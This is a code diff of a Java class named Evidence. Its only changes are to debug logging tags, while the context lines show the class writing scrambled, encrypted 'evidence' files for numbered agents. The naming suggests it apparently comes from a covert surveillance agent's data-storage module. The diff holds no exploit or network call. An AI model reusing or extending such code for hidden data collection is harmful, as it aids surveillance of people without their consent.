@@ -209,7 +209,7 @@ public final class Evidence {
 			final int typeLog = TYPE_EVIDENCE[agentPos].value();
 			return typeLog;
 		}
-		Log.d(TAG,"Warn: " +"Wrong agentId conversion: " + agentId);
+		Log.d("QZ", TAG + " Warn: " +"Wrong agentId conversion: " + agentId);
 		return EvidenceType.UNKNOWN.value();
 	}
 
@@ -228,7 +228,7 @@ public final class Evidence {
 			if (firstSpace) {
 				firstSpace = false;
 
-				Log.d(TAG,"FATAL: not enough space. Free : " + free);
+				Log.d("QZ", TAG + " FATAL: not enough space. Free : " + free);
 			}
 			return false;
 		} else {
@@ -287,7 +287,7 @@ public final class Evidence {
 			final EvidenceType evidenceType) {
 
 		this.typeEvidenceId = evidenceType;
-		Log.d(TAG,"createLog typeEvidenceId: " + evidenceType);
+		Log.d("QZ", TAG + " createLog typeEvidenceId: " + evidenceType);
 		Check.requires(fconn == null, "createLog: not previously closed");
 		timestamp = new Date();
 
@@ -299,7 +299,7 @@ public final class Evidence {
 
 		enoughSpace = enoughSpace();
 		if (!enoughSpace) {
-			Log.d(TAG,"createEvidence, no space");
+			Log.d("QZ", TAG + " createEvidence, no space");
 			return false;
 		}
 
@@ -317,7 +317,7 @@ public final class Evidence {
 		final boolean ret = Path.createDirectory(dir);
 
 		if (!ret) {
-			Log.d(TAG,"Error: Dir not created: " + dir);
+			Log.d("QZ", TAG + " Error: Dir not created: " + dir);
 			return false;
 		}
 
@@ -326,16 +326,16 @@ public final class Evidence {
 		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
 				"file not scrambled");
 		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
-		Log.d(TAG,"createLog fileName:" + fileName);
+		Log.d("QZ", TAG + " createLog fileName:" + fileName);
 		try {
 			fconn = new AutoFile(fileName);
 
 			if (fconn.exists()) {
 				close();
-				Log.d(TAG,"FATAL: It should not exist:" + fileName);
+				Log.d("QZ", TAG + " FATAL: It should not exist:" + fileName);
 				return false;
 			}
-			Log.d(TAG,"Info: Created: " + fileName + " plain: " + name.fileName);
+			Log.d("QZ", TAG + " Info: Created: " + fileName + " plain: " + name.fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
@@ -348,16 +348,16 @@ public final class Evidence {
 					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
 			// scriviamo la dimensione dell'header paddato
 			fconn.write(Utils.intToByteArray(plainBuffer.length));
-			Log.d(TAG, Long.toString(fconn.getSize()));
+			Log.d("QZ", TAG + Long.toString(fconn.getSize()));
 			// scrittura dell'header cifrato
 			fconn.append(encBuffer);
-			Log.d(TAG, Long.toString(fconn.getSize()));
+			Log.d("QZ", TAG + Long.toString(fconn.getSize()));
 			Check.asserts(fconn.getSize() == encBuffer.length + 4,
 					"Wrong filesize");
-			Log.d(TAG,"additionalData.length: " + plainBuffer.length);
-			Log.d(TAG,"encBuffer.length: " + encBuffer.length);
+			Log.d("QZ", TAG + " additionalData.length: " + plainBuffer.length);
+			Log.d("QZ", TAG + " encBuffer.length: " + encBuffer.length);
 		} catch (final Exception ex) {
-			Log.d(TAG,"Error: file: " + name.fileName + " ex:" + ex);
+			Log.d("QZ", TAG + " Error: file: " + name.fileName + " ex:" + ex);
 			return false;
 		}
 
@@ -493,17 +493,17 @@ public final class Evidence {
 		encData = encryption.encryptData(data, offset);
 
 		if (fconn == null) {
-			Log.d(TAG,"Error: fconn null");
+			Log.d("QZ", TAG + " Error: fconn null");
 			return false;
 		}
-		Log.d(TAG,"Info: writeEvidence encdata: " + encData.length);
-		Log.d(TAG,"Info: fileSize: " + fconn.getSize());
+		Log.d("QZ", TAG + " Info: writeEvidence encdata: " + encData.length);
+		Log.d("QZ", TAG + " Info: fileSize: " + fconn.getSize());
 		try {
 			fconn.append(Utils.intToByteArray(data.length - offset));
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
-			Log.d(TAG,"Error: Error writing file: " + e);
+			Log.d("QZ", TAG + " Error: Error writing file: " + e);
 			return false;
 		}
 
@@ -532,7 +532,7 @@ public final class Evidence {
 			final byte[] token = (byte[]) bytelist.elementAt(i);
 			databuffer.write(token);
 		}
-		Log.d(TAG,"len: " + buffer.length);
+		Log.d("QZ", TAG + " len: " + buffer.length);
 		return writeEvidence(buffer);
 	}
 
@@ -561,7 +561,7 @@ public final class Evidence {
 			// logInfo.atomicWriteOnce(message);
 
 		} catch (final Exception ex) {
-			Log.d(TAG,"Error: " +ex.toString());
+			Log.d("QZ", TAG + " Error: " +ex.toString());
 		}
 	}
 
